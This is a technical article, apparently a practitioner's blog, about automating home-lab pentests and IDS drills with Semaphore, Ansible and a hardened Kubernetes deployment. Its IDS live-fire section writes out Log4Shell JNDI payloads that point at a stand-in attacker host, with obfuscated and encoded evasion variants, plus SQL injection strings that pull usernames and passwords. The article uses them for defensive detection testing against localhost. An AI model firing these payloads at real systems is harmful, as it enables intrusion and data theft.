From Scripts to a Security Control Plane: Pentest Automation with Ansible, Semaphore and Kubernetes

Articles · November 2026 · Ioannis Konstas

Over one year I wrote close to four hundred security scripts: penetration tests, IDS live-fire drills, post-quantum attack simulations, hardening checks and the jobs that keep a self-hosted stack alive. Each one worked. Together they were a drawer full of tools that only I knew how to use. This is how that drawer became a control plane: every script one click away, every run logged, and the platform itself running on a hardened Kubernetes cluster.

Security engineering produces scripts the way a workshop produces offcuts. You test a WAF rule, so you write a script that fires the attack. You tighten a cipher suite, so you write a script that proves it. You worry about quantum computers, so you write a simulator that plays the adversary. A year later the scripts are spread across a dozen folders and seventeen Git repositories, each with its own flags, interpreter and assumptions.

The problem is not the scripts. It is that they have no operations layer: no single place to see what exists, run it safely, read the result and prove later what was run and when. Enterprises solve this with Red Hat Ansible Automation Platform (AWX upstream). I wanted the same discipline in a home lab, on one machine, with nothing exposed to the network.

Architecture

The control plane: every test, one click away

Semaphore is a lightweight, open-source web front end for Ansible and plain scripts. I chose it over AWX for a practical reason: AWX wants several gigabytes of RAM for its operator, database and task containers, and this host already runs a SIEM. Semaphore is a single binary. The concepts are the same ones AWX teaches: projects hold work, repositories say where code lives, inventories say where it runs, and templates are saved, repeatable jobs.

The security work lives in its own project, Pentest & Vulnerability Testing 2026, split into subgroups that mirror how an assessment is actually performed: local tests, pentest toolkits, network testing, hardening and monitoring, reports and references, and infrastructure. 172 jobs, each tagged with what it touches.

A job's description carries its blast radius in plain words: sends security test traffic, needs sudo, changes the firewall, posts publicly. Jobs that could take a public service down or launch cloud resources are deliberately status-only. A control plane that makes dangerous actions easy is worse than no control plane.

One runner for four hundred scripts

Writing four hundred wrappers would have been its own maintenance problem. Instead every job calls the same small runner, which picks the interpreter, refuses anything outside the owner's home directory and feeds the script an empty input. That last detail matters: a script that waits for a password would otherwise hang a job forever. With /dev/null as input it stops immediately and says why.

#!/bin/bash
# Runs one of this machine's own scripts with the right interpreter.
S=${1:-}; shift || true
[[ -n $S && -f $S ]] || { echo "No such script: $S"; exit 2; }
case $(cd "$(dirname "$S")" && pwd -P)/ in "$HOME"/*) ;; *) echo "Only scripts under \$HOME are allowed."; exit 2 ;; esac
cd "$(dirname "$S")"
case $S in
  *.py)       RUN=(python3) ;;
  *.mjs|*.js) RUN=(node) ;;
  *.sh)       [[ $(head -1 "$S") == *zsh* ]] && RUN=(zsh) || RUN=(bash) ;;
  *)          echo "Unknown script type: $S"; exit 2 ;;
esac
exec "${RUN[@]}" "$S" "$@" < /dev/null

One lesson from building it: Semaphore's shell runner invokes bash explicitly and ignores the shebang. My first version used a zsh-only array lookup, which bash read as an unbound variable. The fix was to make every helper portable bash, and to verify that a failing script turns the job red instead of green. A dashboard that reports success on failure is a liability.

IDS live-fire: attacking yourself on purpose

A detection rule you have never seen fire is a hypothesis. The live-fire test turns it into evidence. It runs only against localhost, and for every rule category it sends a direct hit and then evasion variants: case tricks, inline comments, double URL encoding. The goal is not just "does the IDS catch the attack" but "does it still catch it when the attacker is clever."

TARGET="http://localhost:${1:-8080}"   # local test target only
DELAY=0.4

_req() {
    local label="$1"; shift
    printf "  %-55s" "$label"
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$@" 2>/dev/null)
    echo "→ HTTP $code"
    sleep "$DELAY"
}

# Log4Shell / JNDI (CVE-2021-44228): direct, then obfuscated
_req "Classic JNDI inject in header" -H 'X-Api-Version: ${jndi:ldap://attacker.example/x}' "$TARGET/"
_req "Obfuscated \${lower:j}ndi prefix" "$TARGET/?v=\${lower:j}ndi:ldap://attacker.example/"
_req "Double-URL-encoded JNDI" "$TARGET/?x=%24%7bjndi%3aldap%3a%2f%2fattacker.example%7d"

# SQL injection: classic, then comment-separated to defeat naive regexes
_req "Classic UNION SELECT" "$TARGET/search?q=1+UNION+SELECT+username,password+FROM+users--"
_req "UNION/**/SELECT (inline comment)" "$TARGET/api?id=1+UNION/**/SELECT/**/1,2,3--"

The pattern is reusable for any rule set: pair each signature with the encodings an attacker would try next, run the pair, and compare what the sensor logged against what you expected. The advanced variant goes further with chunked bodies, header smuggling and Unicode normalization.

Harvest now, decrypt later: simulating a quantum adversary

Traffic recorded today can be decrypted the day a cryptographically relevant quantum computer exists. The defense is hybrid encryption: a classical X25519 exchange and NIST's post-quantum ML-KEM-768 (FIPS 203), both feeding one key-derivation function, with ML-DSA-65 (FIPS 204) signatures on top. An attacker has to break both.

The simulator plays the adversary in six rounds: brute-forcing the ML-KEM key space, assuming Shor's algorithm has already broken X25519, trying a different post-quantum key, forging a signature, replaying captured ciphertext, and finally confirming that the legitimate owner still decrypts. Here is the harvest-now round, condensed:

KEM_ALG = "ML-KEM-768"

# The attacker's own keypair stands in for a future quantum machine
with oqs.KeyEncapsulation(KEM_ALG) as kem_atk:
    _ = kem_atk.generate_keypair()
    wrong_priv = kem_atk.export_secret_key()

try:
    with oqs.KeyEncapsulation(KEM_ALG, secret_key=wrong_priv) as kem_wrong:
        wrong_ss = kem_wrong.decap_secret(ct_kem)          # wrong shared secret

    hkdf = HKDF(algorithm=hashes.SHA3_256(), length=32, salt=None, info=b"PQC-HYBRID-v1")
    AESGCM(hkdf.derive(wrong_ss + bytes(32))).decrypt(nonce, ct_aes, aad)
    log_result("Wrong PQC key rejected", False, "CRITICAL FAILURE")
except Exception:
    # Wrong secret → wrong AES key → GCM authentication tag mismatch
    log_result("Wrong ML-KEM-768 private key rejected", True,
               "decapsulation with the wrong key yields a wrong secret; AES-GCM fails")

The interesting property is that ML-KEM decapsulation with the wrong key does not raise an error. It quietly returns a different shared secret (implicit rejection, by design). The failure surfaces one layer later, when AES-GCM's authentication tag refuses to verify. The test asserts the system fails closed at exactly that point.

Running the platform on Kubernetes

The lab's encrypted audit application moved from a background service to a single-node Kubernetes cluster built with kind. Headlamp, the Kubernetes SIG web UI, gives the cluster a face: health rings for every workload type, and a map of how resources connect.

The design decisions are where the security thinking shows. The application writes one encrypted store, so two writers would corrupt it: the Deployment runs exactly one replica with the Recreate strategy, which deliberately trades zero-downtime updates for data integrity. Knowing when not to use a Kubernetes feature is part of using it well.

spec:
  replicas: 1
  strategy:
    type: Recreate              # never two writers on the encrypted store
  template:
    spec:
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
      containers:
        - name: audit-platform
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: [ALL] }
          readinessProbe: { tcpSocket: { port: http }, periodSeconds: 5 }
          livenessProbe:  { tcpSocket: { port: http }, periodSeconds: 20 }
          resources:
            requests: { cpu: 50m, memory: 128Mi }
            limits:   { memory: 1Gi }

Deleting the pod by hand proved the point of the whole exercise: the ReplicaSet controller saw "want one, have zero" and had a replacement scheduled within a second, with a new name and IP but the same data, because the data lives on a volume outside the pod. The Service kept the address stable, so nothing in front of it noticed.

Ansible: declarative, idempotent, honest about offline hosts

Ansible ties the systems together: a health check of every machine each morning, and a playbook that reconciles the Kubernetes application against its manifest. Run it twice and the second run reports changed=0. That is idempotency, the property that makes automation safe to repeat.

- name: Check all my systems
  hosts: all
  gather_facts: false
  ignore_unreachable: true
  tasks:
    - name: Collect basic facts (OS, uptime, memory)
      ansible.builtin.setup:
        gather_subset: [min, hardware]

    - name: Skip systems that are offline
      ansible.builtin.meta: end_host
      when: ansible_facts.hostname is not defined

Laptops sleep and lab servers are switched off to save money. Without the end_host guard, one offline machine turned the whole report red. With it, offline systems are reported as unreachable and the run still finishes clean.

Lessons that only show up when you build it

SymptomCauseTakeaway
A token "worked" in testing, then failed aloneThe CLI also sent an admin client certificate, and the API server authenticated that firstTest credentials in isolation, with nothing else attached

Mapped to the controls auditors ask about

  • NIST SP 800-53 CA-8, Penetration Testing: repeatable, scheduled self-tests with retained results.
  • SI-4, System Monitoring: IDS live-fire proves detections fire, including against evasion.
  • AU-2 / AU-12, Audit Events: every job run is recorded with who, when and the full output.
  • CM-2 / CM-6, Baseline Configuration: Ansible reconciles declared state and reports drift.
  • SC-12 / SC-13, Cryptographic Protection: hybrid ML-KEM-768 + X25519 with ML-DSA-65, tested adversarially.
  • AC-6, Least Privilege: non-root containers, dropped capabilities, no service-account tokens, status-only controls for risky jobs.

The takeaway

Tools are easy; operations are hard. The scripts were already good. What changed is that they now have the properties an enterprise security team expects: discoverable, repeatable, scheduled, logged, least-privileged and honest when something fails. The same structure transfers directly to AWX or Ansible Automation Platform, and the Kubernetes manifests to any managed cluster. The home lab is simply where the discipline is cheapest to practice.
